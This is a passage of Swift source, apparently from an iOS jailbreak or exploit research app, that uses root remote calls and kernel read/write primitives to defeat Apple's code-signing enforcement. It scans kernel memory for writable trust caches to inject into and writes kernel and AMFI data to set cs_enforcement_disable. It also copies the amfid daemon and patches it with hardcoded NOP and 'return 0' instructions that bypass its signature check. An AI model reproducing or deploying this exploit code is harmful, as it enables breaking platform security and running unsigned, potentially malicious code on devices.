            RootExecutor.rcall(rc, "free", svcAddr)
            detail += "\n"
        }

        // Step 3: Also try direct function call amfi_load_trust_cache
        detail += "=== Step 3: Direct amfi_load_trust_cache ===\n"

        let amfiLoadTC = RootExecutor.rcall(rc, "dlsym", RTLD_DEFAULT,
                                            remote_alloc_str(rc, "amfi_load_trust_cache"))
        detail += "amfi_load_trust_cache: 0x\(String(format: "%llx", amfiLoadTC))\n"

        if amfiLoadTC != 0 {
            // amfi_load_trust_cache(data, size) — try calling directly
            let tcBuf = mem + 0x800
            let ret = RootExecutor.rcallAddr(rc, amfiLoadTC, tcBuf, 48)
            detail += "Direct call ret: \(ret)\n"
            if ret == 0 {
                detail += "RET=0! Trust cache mungkin loaded!\n"
            } else {
                detail += "Failed (expected — needs entitlement)\n"
            }
        } else {
            detail += "Not found in shared cache\n"
        }

        // Step 4: Try posix_spawn setelah TC load attempt
        detail += "\n=== Step 4: Test spawn ===\n"
        let testPath = "/var/containers/Bundle/.exp100_test"
        let testAddr = remote_alloc_str(rc, testPath)

        // Copy amfid ke test path
        let srcAddr = remote_alloc_str(rc, "/usr/libexec/amfid")
        let srcFd = RootExecutor.rcall(rc, "open", srcAddr, UInt64(O_RDONLY), 0)
        let dstFd = RootExecutor.rcall(rc, "open", testAddr, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o755)
        if srcFd != UInt64(bitPattern: -1) && dstFd != UInt64(bitPattern: -1) {
            let buf = mem + 0x2000
            for _ in 0..<256 {
                let n = RootExecutor.rcall(rc, "read", srcFd, buf, 4096)
                if n == 0 || n == UInt64(bitPattern: -1) { break }
                RootExecutor.rcall(rc, "write", dstFd, buf, n)
                if n < 4096 { break }
            }
        }
        RootExecutor.rcall(rc, "close", srcFd)
        RootExecutor.rcall(rc, "close", dstFd)
        RootExecutor.rcall(rc, "chmod", testAddr, 0o755)

        let (ret, pid, err) = doSpawn(rc: rc, path: testPath, mem: mem)
        detail += "posix_spawn: ret=\(ret), pid=\(pid), errno=\(err)\n"
        if ret == 0 && pid != 0 {
            let (sig, code) = doWait(rc: rc, pid: pid, mem: mem)
            detail += "exit: signal=\(sig), code=\(code)\n"
            if sig != 9 {
                detail += "\nNO SIGKILL! Trust cache load mungkin berhasil!\n"
            } else {
                detail += "\nSIGKILL — TC load tidak berhasil (expected)\n"
            }
        }

        // Cleanup
        RootExecutor.rcall(rc, "unlink", tcPathAddr)
        RootExecutor.rcall(rc, "unlink", testAddr)
        RootExecutor.rcall(rc, "free", tcPathAddr)
        RootExecutor.rcall(rc, "free", testAddr)
        RootExecutor.rcall(rc, "free", srcAddr)

        // Verdict
        detail += "\n=== VERDICT ===\n"
        if anyConnected {
            detail += "XPC connections berhasil dibuat!\n"
            detail += "Message sent ke services.\n"
            detail += "Tapi TC load kemungkinan di-reject karena:\n"
            detail += "  1. Trust cache tidak personalized (no Image4 signature)\n"
            detail += "  2. Launchd tidak punya entitlement yang dibutuhkan\n"
            detail += "  3. Message format salah\n\n"
            detail += "NEXT: Coba dari MobileStorageMounter context langsung\n"
            detail += "atau craft personalized trust cache (butuh TSS bypass)\n"
        } else {
            detail += "Tidak bisa connect ke XPC services dari launchd.\n"
            detail += "Services mungkin butuh specific entitlement untuk connect.\n"
        }

        return ExperimentResult(name: expName, success: anyConnected, detail: detail, timestamp: Date())
    }
    #endif

    // MARK: - Exp 93c Helpers

    private struct SpawnResult {
        let success: Bool
        let log: String
        let exitCode: Int32
        let signal: Int32
        let stdout: String
    }

    /// posix_spawn with pipe to capture stdout
    private func spawnAndCapture(rc: RemoteCall, binaryPath: String, mem: UInt64) -> SpawnResult {
        var log = ""
        let binAddr = remote_alloc_str(rc, binaryPath)

        // Create pipe for stdout capture
        let pipeFds = mem + 0x600  // [read_fd, write_fd]
        rc[pipeFds].setValue32(0)
        rc[pipeFds + 4].setValue32(0)
        let pipeRet = RootExecutor.rcall(rc, "pipe", pipeFds)

        let readFd = Int32(bitPattern: rc[pipeFds].value32())
        let writeFd = Int32(bitPattern: rc[pipeFds + 4].value32())

        if pipeRet != 0 {
            log += "  pipe() failed, falling back to simple spawn\n"
            // Fallback: simple spawn without capture
            let argvBase = mem + 0x500
            rc[argvBase].setValue64(binAddr)
            rc[argvBase + 8].setValue64(0)
            let pidAddr = mem + 0x480
            rc[pidAddr].setValue32(0)

            let ret = RootExecutor.rcall(rc, "posix_spawn", pidAddr, binAddr, 0, 0, argvBase, 0)
            let pid = rc[pidAddr].value32()
            log += "  posix_spawn: ret=\(ret), pid=\(pid)\n"

            if ret == 0 && pid != 0 {
                let statusAddr = mem + 0x490
                rc[statusAddr].setValue32(0)
                RootExecutor.rcall(rc, "waitpid", UInt64(pid), statusAddr, 0)
                let st = rc[statusAddr].value32()
                let sig = Int32(st & 0x7F)
                let code = Int32(st >> 8)
                log += "  exit: signal=\(sig), code=\(code)\n"
                RootExecutor.rcall(rc, "free", binAddr)
                return SpawnResult(success: sig != 9 && sig == 0, log: log, exitCode: code, signal: sig, stdout: "")
            } else {
                let err = remote_errno(rc)
                log += "  FAILED: errno=\(err)\n"
                RootExecutor.rcall(rc, "free", binAddr)
                return SpawnResult(success: false, log: log, exitCode: -1, signal: -1, stdout: "")
            }
        }

        // Setup posix_spawn_file_actions to redirect stdout to pipe
        // posix_spawn_file_actions_t is opaque — size varies, allocate 128 bytes
        let fileActionsAddr = mem + 0x650
        let initRet = RootExecutor.rcall(rc, "posix_spawn_file_actions_init", fileActionsAddr)

        if initRet == 0 {
            // dup2 write end of pipe to stdout (fd 1)
            RootExecutor.rcall(rc, "posix_spawn_file_actions_adddup2", fileActionsAddr, UInt64(Int64(writeFd)), 1)
            // Also redirect stderr to pipe
            RootExecutor.rcall(rc, "posix_spawn_file_actions_adddup2", fileActionsAddr, UInt64(Int64(writeFd)), 2)
            // Close read end in child
            RootExecutor.rcall(rc, "posix_spawn_file_actions_addclose", fileActionsAddr, UInt64(Int64(readFd)))
        }

        // argv = [binary, NULL]
        let argvBase = mem + 0x500
        rc[argvBase].setValue64(binAddr)
        rc[argvBase + 8].setValue64(0)

        // Spawn
        let pidAddr = mem + 0x480
        rc[pidAddr].setValue32(0)
        let spawnRet = RootExecutor.rcall(rc, "posix_spawn", pidAddr, binAddr,
                                          initRet == 0 ? fileActionsAddr : 0, 0, argvBase, 0)
        let pid = rc[pidAddr].value32()

        log += "  posix_spawn: ret=\(spawnRet), pid=\(pid)\n"

        // Close write end in parent (so read gets EOF when child exits)
        RootExecutor.rcall(rc, "close", UInt64(Int64(writeFd)))

        var stdoutStr = ""
        if spawnRet == 0 && pid != 0 {
            // Read stdout from pipe (max 1024 bytes)
            let readBuf = mem + 0x1000
            let nread = RootExecutor.rcall(rc, "read", UInt64(Int64(readFd)), readBuf, 1024)
            if nread > 0 && nread < 1024 {
                // Read bytes from remote userspace memory via RC accessor
                var bytes: [UInt8] = []
                for i: UInt64 in 0..<min(nread, 256) {
                    let b = rc[readBuf + i].value8()
                    if b == 0 { break }
                    bytes.append(b)
                }
                stdoutStr = String(bytes: bytes, encoding: .utf8) ?? "(binary data)"
                log += "  stdout (\(nread) bytes): \(stdoutStr.prefix(200))\n"
            } else if nread == 0 {
                log += "  stdout: (empty)\n"
            }

            // Wait for child
            let statusAddr = mem + 0x490
            rc[statusAddr].setValue32(0)
            RootExecutor.rcall(rc, "waitpid", UInt64(pid), statusAddr, 0)
            let st = rc[statusAddr].value32()
            let sig = Int32(st & 0x7F)
            let code = Int32(st >> 8)
            log += "  exit: signal=\(sig), code=\(code)\n"

            RootExecutor.rcall(rc, "close", UInt64(Int64(readFd)))
            if initRet == 0 { RootExecutor.rcall(rc, "posix_spawn_file_actions_destroy", fileActionsAddr) }
            RootExecutor.rcall(rc, "free", binAddr)

            let ok = (sig != 9 && sig == 0)
            if sig == 9 { log += "  ❌ SIGKILL by AMFI\n" }
            else if ok { log += "  ✅ SUCCESS\n" }
            return SpawnResult(success: ok, log: log, exitCode: code, signal: sig, stdout: stdoutStr)
        } else {
            let err = remote_errno(rc)
            log += "  FAILED: errno=\(err)\n"
            RootExecutor.rcall(rc, "close", UInt64(Int64(readFd)))
            if initRet == 0 { RootExecutor.rcall(rc, "posix_spawn_file_actions_destroy", fileActionsAddr) }
            RootExecutor.rcall(rc, "free", binAddr)
            return SpawnResult(success: false, log: log, exitCode: -1, signal: -1, stdout: "")
        }
    }

    /// fork + execve with waitpid
    private func forkExecAndCapture(rc: RemoteCall, binaryPath: String, mem: UInt64) -> SpawnResult {
        var log = ""
        let binAddr = remote_alloc_str(rc, binaryPath)
        let argvBase = mem + 0x500
        rc[argvBase].setValue64(binAddr)
        rc[argvBase + 8].setValue64(0)

        let childPid = RootExecutor.rcall(rc, "fork")
        log += "  fork() = \(childPid)\n"

        if childPid == 0 {
            // Child process — execve
            RootExecutor.rcall(rc, "execve", binAddr, argvBase, 0)
            RootExecutor.rcall(rc, "_exit", 127)
            RootExecutor.rcall(rc, "free", binAddr)
            return SpawnResult(success: false, log: log + "  (in child, execve returned)\n", exitCode: 127, signal: 0, stdout: "")
        } else if childPid != UInt64(bitPattern: -1) {
            // Parent — wait for child
            let statusAddr = mem + 0x490
            rc[statusAddr].setValue32(0)
            RootExecutor.rcall(rc, "waitpid", childPid, statusAddr, 0)
            let st = rc[statusAddr].value32()
            let sig = Int32(st & 0x7F)
            let code = Int32(st >> 8)

            log += "  child exit: signal=\(sig), code=\(code)\n"

            RootExecutor.rcall(rc, "free", binAddr)

            if sig == 9 {
                log += "  ❌ SIGKILL by AMFI\n"
                return SpawnResult(success: false, log: log, exitCode: code, signal: sig, stdout: "")
            } else if sig == 0 && code != 127 {
                log += "  ✅ execve SUCCESS\n"
                return SpawnResult(success: true, log: log, exitCode: code, signal: sig, stdout: "")
            } else {
                log += "  ⚠️ execve likely failed (code=127 means execve returned)\n"
                return SpawnResult(success: false, log: log, exitCode: code, signal: sig, stdout: "")
            }
        } else {
            let err = remote_errno(rc)
            log += "  fork() FAILED: errno=\(err)\n"
            RootExecutor.rcall(rc, "free", binAddr)
            return SpawnResult(success: false, log: log, exitCode: -1, signal: -1, stdout: "")
        }
    }

    // MARK: - Exp 94: Heap Trust Cache Scan

    /// Exp 94: Scan __DATA zero slots on-device to find heap trust cache pointers.
    /// Cryptex trust caches (System + App) are loaded at runtime into HEAP memory.
    /// The head pointer lives in a __DATA slot that's 0 in kernelcache but non-zero at runtime.
    private func runExp94HeapTCScan() {
        isRunning = true
        runningLabel = "Heap TC"
        guard mgr.dsready, PhysmapConstants.isVerified else {
            isRunning = false
            runningLabel = ""
            return
        }
        DispatchQueue.global(qos: .userInitiated).async {
            let result = self.expHeapTCScan()
            DispatchQueue.main.async {
                self.results.insert(result, at: 0)
                self.isRunning = false
                self.runningLabel = ""
            }
        }
    }

    private func expHeapTCScan() -> ExperimentResult {
        let expName = "Heap TC Scan (Exp 94)"
        var detail = "Experiment 94: Heap Trust Cache Scan\n"
        detail += "=====================================\n\n"

        let kernBase = ds_get_kernel_base()
        let dataOff = PhysmapConstants.dataOffsetFromText
        let dataSegBase = kernBase &+ dataOff

        detail += "Kernel base: 0x\(String(format: "%llx", kernBase))\n"
        detail += "__DATA base: 0x\(String(format: "%llx", dataSegBase))\n\n"

        // Trust cache v2 format (confirmed from IPSW):
        //   +0x00: uint32 version (= 2)
        //   +0x04: uuid[16]
        //   +0x14: uint32 count
        //   +0x18: entries[count] (24 bytes each)
        detail += "Trust Cache v2 layout (confirmed from IPSW):\n"
        detail += "  +0x00: version (uint32) = 2\n"
        detail += "  +0x04: uuid (16 bytes)\n"
        detail += "  +0x14: count (uint32)\n"
        detail += "  +0x18: entries[] (24 bytes each)\n\n"

        // Dynamic TC candidate slots from deep_tc_analysis.py
        // These are zero in kernelcache = filled at runtime with heap pointers
        let candidateSlots: [(offset: UInt64, label: String)] = [
            (0x3980, "trust_cache region (14 refs)"),
            (0x38e0, "trust_cache region (5 refs)"),
            (0x3920, "trust_cache region (4 refs)"),
            (0x3930, "trust_cache region (4 refs)"),
            (0x38a0, "trust_cache region (3 refs)"),
            (0x38c0, "trust_cache region (3 refs)"),
            (0xe8, "early-init (214 refs)"),
            (0x2770, "pmap_cs region (8 refs)"),
            (0x2d0, "general (8 refs)"),
            (0x1a4, "general (8 refs)"),
            (0x248, "general (12 refs)"),
            (0xf8, "early-init (9 refs)"),
            (0x1f8, "general (6 refs)"),
            (0x48, "early-init (5 refs)"),
            (0xb4, "early-init (5 refs)"),
            (0x45b8, "amfi_policy (4 refs)"),
        ]

        detail += "=== Scanning \(candidateSlots.count) __DATA slots ===\n\n"

        var heapTCFound: [(slot: UInt64, ptr: UInt64, ver: UInt32, count: UInt32)] = []

        for (off, label) in candidateSlots {
            let slotAddr = dataSegBase &+ off
            let ptr = ds_kreadptr(slotAddr)

            if ptr == 0 {
                detail += "  +0x\(String(format: "%04x", off)): NULL (\(label))\n"
                continue
            }

            detail += "  +0x\(String(format: "%04x", off)): 0x\(String(format: "%llx", ptr)) (\(label))\n"

            // Filter known-bad values that pass isSafeKernelKreadAddress but are unmapped
            // 0xffffff8000000000 is the base of kernel VA space — not a real object pointer
            if ptr == 0xffffff8000000000 || ptr == 0xffffff8000000001 {
                detail += "    → kernel VA base (unmapped boundary), skip\n"
                continue
            }

            // Check if pointer is in heap range
            let isHeap = isSafeKernelHeapKreadAddress(ptr)
            let isKern = isSafeKernelKreadAddress(ptr)

            if !isHeap && !isKern {
                detail += "    → outside safe read range, skip\n"
                continue
            }

            // Try to read as trust cache v2 struct
            let ver: UInt32
            let count: UInt32
            if isHeap {
                ver = safeKread32Heap(ptr)
                count = safeKread32Heap(ptr &+ 0x14)
            } else {
                ver = safeKread32Kernel(ptr)
                count = safeKread32Kernel(ptr &+ 0x14)
            }

            detail += "    ver=\(ver), count(+0x14)=\(count)"

            if ver == 2 && count >= 1 && count <= 500_000 {
                detail += " ← TRUST CACHE v2!\n"

                // Read UUID
                var uuidHex = ""
                for i: UInt64 in stride(from: 4, to: 20, by: 4) {
                    let chunk = isHeap ? safeKread32Heap(ptr &+ i) : safeKread32Kernel(ptr &+ i)
                    uuidHex += String(format: "%08x", chunk)
                }
                detail += "    uuid: \(uuidHex)\n"

                // Read first entry CDHash
                let entryBase = ptr &+ 0x18
                var cdhashHex = ""
                for i: UInt64 in stride(from: 0, to: 20, by: 4) {
                    let chunk = isHeap ? safeKread32Heap(entryBase &+ i) : safeKread32Kernel(entryBase &+ i)
                    cdhashHex += String(format: "%08x", chunk)
                }
                let hashType = isHeap ? safeKread32Heap(entryBase &+ 20) & 0xFF : safeKread32Kernel(entryBase &+ 20) & 0xFF
                detail += "    entry[0]: \(cdhashHex) ht=\(hashType)\n"

                heapTCFound.append((off, ptr, ver, count))

                // Check if this is in HEAP (writable!)
                if isHeap {
                    detail += "    📍 LOCATION: HEAP (WRITABLE!)\n"
                } else {
                    detail += "    📍 LOCATION: kernel __DATA/TEXT (KTRR protected)\n"
                }
            } else if ver == 1 && count >= 1 && count <= 500_000 {
                // v1 format: version(4) + count(4) + entries
                let countV1 = isHeap ? safeKread32Heap(ptr &+ 4) : safeKread32Kernel(ptr &+ 4)
                detail += " (v1? count@+4=\(countV1))\n"
                if countV1 >= 1 && countV1 <= 500_000 {
                    heapTCFound.append((off, ptr, 1, countV1))
                    if isHeap {
                        detail += "    📍 LOCATION: HEAP (WRITABLE!)\n"
                    }
                }
            } else {
                // Not a trust cache — might be linked list node
                detail += "\n"

                // Try following as linked list: ptr → next at +0x00 or +0x08
                let next0 = isHeap ? safeKread64Heap(ptr) : safeKread64Kernel(ptr)
                let next8 = isHeap ? safeKread64Heap(ptr &+ 8) : safeKread64Kernel(ptr &+ 8)

                // Check if it's a wrapper struct: {next, tc_ptr}
                for (nextOff, nextVal) in [(UInt64(0), next0), (UInt64(8), next8)] {
                    let nextPtr = nextVal & 0x0000FFFFFFFFFFFF  // strip PAC
                    guard nextPtr > 0xffffffdc00000000, nextPtr < 0xffffffe500000000 else { continue }
                    guard isSafeKernelHeapKreadAddress(nextPtr) else { continue }

                    let innerVer = safeKread32Heap(nextPtr)
                    let innerCount = safeKread32Heap(nextPtr &+ 0x14)
                    if innerVer == 2 && innerCount >= 1 && innerCount <= 500_000 {
                        detail += "    → follow +0x\(String(format: "%x", nextOff)): 0x\(String(format: "%llx", nextPtr))\n"
                        detail += "      ver=\(innerVer), count=\(innerCount) ← TRUST CACHE v2 (HEAP)!\n"
                        heapTCFound.append((off, nextPtr, innerVer, innerCount))
                    }
                }
            }
        }

        detail += "\n"

        // Summary
        detail += "=== SUMMARY ===\n\n"

        if heapTCFound.isEmpty {
            detail += "❌ No heap trust cache found in scanned slots.\n\n"
            detail += "Possible reasons:\n"
            detail += "  1. Cryptex TC loaded at different __DATA offset\n"
            detail += "  2. TC pointer is behind linked list wrapper\n"
            detail += "  3. Need to scan more slots or follow pointer chains\n"
        } else {
            detail += "✅ Found \(heapTCFound.count) trust cache(s):\n\n"
            for (i, tc) in heapTCFound.enumerated() {
                let isHeap = isSafeKernelHeapKreadAddress(tc.ptr)
                detail += "  [\(i)] __DATA+0x\(String(format: "%x", tc.slot))\n"
                detail += "      ptr: 0x\(String(format: "%llx", tc.ptr))\n"
                detail += "      ver: \(tc.ver), count: \(tc.count)\n"
                detail += "      writable: \(isHeap ? "YES (HEAP)" : "NO (KTRR)")\n\n"
            }

            // If any are in heap, we can inject!
            let writableTCs = heapTCFound.filter { isSafeKernelHeapKreadAddress($0.ptr) }
            if !writableTCs.isEmpty {
                detail += "🎉🎉🎉 WRITABLE TRUST CACHE FOUND! 🎉🎉🎉\n\n"
                detail += "Next: Exp 92 with CORRECT offsets:\n"
                detail += "  TC addr: 0x\(String(format: "%llx", writableTCs[0].ptr))\n"
                detail += "  Count offset: +0x14 (not +0x04!)\n"
                detail += "  Entries offset: +0x18 (not +0x08!)\n"
                detail += "  Entry stride: 24 bytes\n"

                // Save for use by other experiments
                DispatchQueue.main.async {
                    self.probedTCAddr = writableTCs[0].ptr
                    self.probedTCCount = writableTCs[0].count
                    self.probedTCStride = 24
                }
            }
        }

        return ExperimentResult(name: expName, success: !heapTCFound.isEmpty, detail: detail, timestamp: Date())
    }

    // MARK: - Exp 95: cs_enforcement_disable

    /// Exp 95: Find and set cs_enforcement_disable flag.
    /// The function at 0xfffffff008f852dc references "cs_enforcement_disable" string.
    /// Trace its __DATA accesses to find the actual flag variable.
    private func runExp95CSDisable() {
        isRunning = true
        runningLabel = "CS Disable"
        guard mgr.dsready, PhysmapConstants.isVerified else {
            isRunning = false
            runningLabel = ""
            return
        }
        DispatchQueue.global(qos: .userInitiated).async {
            let result = self.expCSDisable()
            DispatchQueue.main.async {
                self.results.insert(result, at: 0)
                self.isRunning = false
                self.runningLabel = ""
            }
        }
    }

    private func expCSDisable() -> ExperimentResult {
        let expName = "CS Disable (Exp 95)"
        var detail = "Experiment 95: cs_enforcement_disable\n"
        detail += "=======================================\n\n"

        let kernBase = ds_get_kernel_base()
        let slide = kernBase - 0xfffffff007004000
        let dataSegBase = kernBase &+ PhysmapConstants.dataOffsetFromText

        detail += "Kernel base: 0x\(String(format: "%llx", kernBase))\n"
        detail += "KASLR slide: 0x\(String(format: "%llx", slide))\n"
        detail += "__DATA base: 0x\(String(format: "%llx", dataSegBase))\n\n"

        // cs_enforcement_disable string found at 0xfffffff00749cd5d (unslid)
        // Referenced by function at 0xfffffff008f852dc (unslid)
        // That function likely reads/writes a __DATA global for the flag

        // Strategy: scan known __DATA slots that might be cs_enforcement_disable
        // The flag is likely a single byte or uint32 in __DATA
        // From deep_tc_analysis: slot +0x45b8 is "amfi_policy region" (4 refs)
        // This is the most likely candidate for cs_enforcement_disable

        detail += "=== Strategy ===\n"
        detail += "cs_enforcement_disable string at 0x\(String(format: "%llx", 0xfffffff00749cd5d &+ slide))\n"
        detail += "Referenced by func at 0x\(String(format: "%llx", 0xfffffff008f852dc &+ slide))\n\n"

        // Scan AMFI-related __DATA slots
        let csSlotCandidates: [(UInt64, String)] = [
            (0x45b8, "amfi_policy region (4 refs)"),
            (0x45c0, "amfi_policy +8"),
            (0x45c8, "amfi_policy +16"),
            (0x45d0, "amfi_policy +24"),
            (0x45d8, "amfi_policy +32"),
            (0x45e0, "amfi_policy +40"),
            (0x45e8, "amfi_policy +48"),
            (0x45f0, "amfi_policy +56"),
            (0x4600, "amfi_policy +72"),
            (0x4608, "amfi_policy +80"),
        ]

        detail += "=== Scanning __DATA amfi_policy region ===\n\n"

        var foundDisableFlag: (addr: UInt64, offset: UInt64, value: UInt64)?

        for (off, label) in csSlotCandidates {
            let addr = dataSegBase &+ off
            let val = ds_kread64_safe(addr)
            detail += "  +0x\(String(format: "%04x", off)): 0x\(String(format: "%016llx", val)) (\(label))\n"

            // cs_enforcement_disable is likely 0 (disabled by default on production)
            // or 1 (if somehow enabled). We want to SET it to 1.
            if val == 0 || val == 1 {
                if foundDisableFlag == nil {
                    foundDisableFlag = (addr, off, val)
                }
            }
        }

        detail += "\n"

        // Also check the AMFI __DATA boolean flags
        detail += "=== AMFI __DATA flags (fileset component) ===\n"
        let amfiDataSlid = UInt64(0xfffffff00a330098) &+ slide

        // These flags are already 1 — try setting to 0 to disable AMFI
        let amfiFlagOffsets: [UInt64] = [0x110, 0x160, 0x1b0, 0x200, 0x250, 0x2a0, 0x2f0, 0x340, 0x398, 0x408]

        for off in amfiFlagOffsets {
            let addr = amfiDataSlid &+ off
            let val = ds_kread64_safe(addr)
            detail += "  AMFI+0x\(String(format: "%03x", off)): \(val)\n"
        }
        detail += "\n"

        // Try write to amfi_policy region (+0x45b8)
        detail += "=== Write test: __DATA+0x45b8 ===\n"
        let testAddr = dataSegBase &+ 0x45b8
        let beforeVal = ds_kread64_safe(testAddr)
        detail += "Before: 0x\(String(format: "%016llx", beforeVal))\n"

        // Write 1 (enable cs_enforcement_disable = disable enforcement)
        ds_kwrite32(testAddr, 1)
        let afterVal = ds_kread32_safe(testAddr)
        detail += "After write 1: 0x\(String(format: "%08x", afterVal))\n\n"

        let mainDataWriteOK = (afterVal == 1 && beforeVal != 1)

        if mainDataWriteOK {
            detail += "✅ Main kernel __DATA+0x45b8 IS WRITABLE!\n\n"
            detail += "This is unexpected — main __DATA should be KTRR protected.\n"
            detail += "But if it works, cs_enforcement_disable might be active!\n\n"

            // Restore
            ds_kwrite32(testAddr, UInt32(beforeVal & 0xFFFFFFFF))

            detail += "Test: spawn unsigned binary to confirm CS is disabled.\n"
        } else {
            detail += "❌ Main __DATA write failed (KTRR as expected).\n\n"

            // Try AMFI __DATA instead
            detail += "=== Trying AMFI __DATA flags ===\n"
            let amfiTestAddr = amfiDataSlid &+ 0x110
            let amfiBefore = ds_kread64_safe(amfiTestAddr)
            detail += "AMFI+0x110 before: 0x\(String(format: "%016llx", amfiBefore))\n"

            // Try write 0 (disable this flag)
            ds_kwrite64(amfiTestAddr, 0)
            let amfiAfter = ds_kread64_safe(amfiTestAddr)
            detail += "AMFI+0x110 after write 0: 0x\(String(format: "%016llx", amfiAfter))\n\n"

            let amfiWriteOK = (amfiAfter == 0 && amfiBefore != 0)
            if amfiWriteOK {
                detail += "✅ AMFI __DATA IS WRITABLE!\n\n"
                // Restore
                ds_kwrite64(amfiTestAddr, amfiBefore)
                detail += "Restored. Next: disable ALL AMFI flags and test spawn.\n"
            } else {
                detail += "❌ AMFI __DATA also KTRR-protected.\n"
                detail += "All fileset __DATA is within KTRR range on A12.\n"
            }

            return ExperimentResult(name: expName, success: amfiWriteOK, detail: detail, timestamp: Date())
        }

        return ExperimentResult(name: expName, success: mainDataWriteOK, detail: detail, timestamp: Date())
    }

    // MARK: - Patch amfid (safe — no kill, no respring)

    /// Copy /usr/libexec/amfid ke /var/tmp/.amfid_patched dan NOP semua CBNZ W0.
    /// TIDAK kill amfid, TIDAK physmap write, TIDAK respring.
    /// Setelah ini, Exp 91 Test B bisa spawn patched version.
    private func runPatchAmfidOnly() {
        isRunning = true
        runningLabel = "Patch safe"
        guard mgr.rcready else {
            isRunning = false
            runningLabel = ""
            return
        }

        #if !DISABLE_REMOTECALL
        root.executeAsRoot(operation: "patch_amfid_safe") { rc in
            let result = self.expPatchAmfidSafe(rc: rc)
            DispatchQueue.main.async {
                self.results.insert(result, at: 0)
                self.isRunning = false
                self.runningLabel = ""
            }
            return (result.success, result.detail.prefix(80).description, 0)
        }
        #else
        isRunning = false
        runningLabel = ""
        #endif
    }

    #if !DISABLE_REMOTECALL
    private func expPatchAmfidSafe(rc: RemoteCall) -> ExperimentResult {
        let expName = "Patch amfid (safe)"
        var detail = "Copy + Patch amfid (NO kill, NO respring)\n"
        detail += "==========================================\n\n"

        let mem = rc.trojanMem
        let srcPath = remote_alloc_str(rc, "/usr/libexec/amfid")
        let dstPath = remote_alloc_str(rc, "/var/tmp/.amfid_patched")
        let NOP: UInt32 = 0xD503201F

        // Hardcoded offsets dari on-device analysis
        let patchOffsets: [UInt64] = [
            0x274c, 0x2764, 0x2c68, 0x2d68, 0x33c0,
            0x348c, 0x372c, 0x3a9c, 0x3f24, 0x4164,
            0x41ec, 0x4284, 0x431c,
        ]

        // Step 1: Copy
        detail += "Step 1: Copy /usr/libexec/amfid...\n"
        RootExecutor.rcall(rc, "unlink", dstPath)
        let srcFd = RootExecutor.rcall(rc, "open", srcPath, UInt64(O_RDONLY), 0)
        let dstFd = RootExecutor.rcall(rc, "open", dstPath, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o755)

        guard srcFd != UInt64(bitPattern: -1) && dstFd != UInt64(bitPattern: -1) else {
            detail += "open gagal\n"
            RootExecutor.rcall(rc, "free", srcPath)
            RootExecutor.rcall(rc, "free", dstPath)
            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
        }

        let buf = mem + 0x800
        var total: UInt64 = 0
        for _ in 0..<512 {
            let n = RootExecutor.rcall(rc, "read", srcFd, buf, 4096)
            if n == 0 || n > 4096 { break }
            RootExecutor.rcall(rc, "write", dstFd, buf, n)
            total += n
        }
        RootExecutor.rcall(rc, "close", srcFd)
        RootExecutor.rcall(rc, "close", dstFd)
        detail += "Copied \(total) bytes\n\n"

        // Step 2: Patch
        detail += "Step 2: Patch CBNZ W0 -> NOP...\n"
        let patchFd = RootExecutor.rcall(rc, "open", dstPath, UInt64(O_RDWR), 0)
        guard patchFd != UInt64(bitPattern: -1) else {
            detail += "open for patch gagal\n"
            RootExecutor.rcall(rc, "free", srcPath)
            RootExecutor.rcall(rc, "free", dstPath)
            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
        }

        let nopBuf = mem + 0x2000
        rc[nopBuf].setValue32(NOP)
        var patched = 0

        for offset in patchOffsets {
            RootExecutor.rcall(rc, "lseek", patchFd, offset, 0)
            let rdBuf = mem + 0x2100
            RootExecutor.rcall(rc, "read", patchFd, rdBuf, 4)
            let orig = rc[rdBuf].value32()
            let isCBNZ = (orig >> 24) == 0x35 && (orig & 0x1F) == 0
            guard isCBNZ else { continue }

            RootExecutor.rcall(rc, "lseek", patchFd, offset, 0)
            let wn = RootExecutor.rcall(rc, "write", patchFd, nopBuf, 4)
            if wn == 4 { patched += 1 }
        }

        // Patch signature check function (0x1c830): MOV W0,#0 + RET
        RootExecutor.rcall(rc, "lseek", patchFd, 0x1c830, 0)
        rc[nopBuf].setValue32(0x52800000)     // MOV W0, #0
        rc[nopBuf + 4].setValue32(0xD65F03C0) // RET
        let sigWn = RootExecutor.rcall(rc, "write", patchFd, nopBuf, 8)
        if sigWn == 8 { patched += 1 }

        RootExecutor.rcall(rc, "close", patchFd)
        RootExecutor.rcall(rc, "free", srcPath)
        RootExecutor.rcall(rc, "free", dstPath)

        detail += "Patched: \(patched) instruksi\n\n"
        detail += "File: /var/tmp/.amfid_patched\n"
        detail += "Sekarang jalankan Exp 91 untuk spawn patched version.\n"

        return ExperimentResult(name: expName, success: patched > 0, detail: detail, timestamp: Date())
    }
    #endif

    // MARK: - Dump amfid binary

    /// Copy /usr/libexec/amfid ke Documents folder via launchd RC.
    /// User bisa ambil dari Files app → On My iPhone → DSPloit.
    /// Untuk analisis offline dengan scripts/analyze_amfid.py.
    private func runDumpAmfid() {
        isRunning = true
        runningLabel = "Dump amfid"
        guard mgr.rcready else {
            isRunning = false
            runningLabel = ""
            return
        }

        #if !DISABLE_REMOTECALL
        root.executeAsRoot(operation: "dump_amfid") { rc in
            let result = self.expDumpAndAnalyzeAmfid(rc: rc)
            DispatchQueue.main.async {
                self.results.insert(result, at: 0)
                self.isRunning = false
                self.runningLabel = ""
            }
            return (result.success, result.detail.prefix(80).description, 0)
        }
        #else
        isRunning = false
        runningLabel = ""
        #endif
    }

    #if !DISABLE_REMOTECALL
    /// Dump amfid binary + analisis on-device: scan ARM64 instruksi untuk patch targets.
    /// Output: offset CBNZ W0 yang perlu di-NOP untuk bypass signature check.
    private func expDumpAndAnalyzeAmfid(rc: RemoteCall) -> ExperimentResult {
        let expName = "Dump + Analyze amfid"
        var detail = "Dump + Analyze /usr/libexec/amfid (on-device)\n"
        detail += "================================================\n\n"

        let mem = rc.trojanMem
        let srcPathStr = "/usr/libexec/amfid"
        let srcPath = remote_alloc_str(rc, srcPathStr)

        // ── Step 1: Open amfid binary ────────────────────────────────
        detail += "=== Step 1: Open amfid ===\n"
        let srcFd = RootExecutor.rcall(rc, "open", srcPath, UInt64(O_RDONLY), 0)
        guard srcFd != UInt64(bitPattern: -1) else {
            let err = remote_errno(rc)
            detail += "❌ open(\(srcPathStr)) gagal: errno=\(err)\n"
            RootExecutor.rcall(rc, "free", srcPath)
            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
        }

        // Get file size via lseek
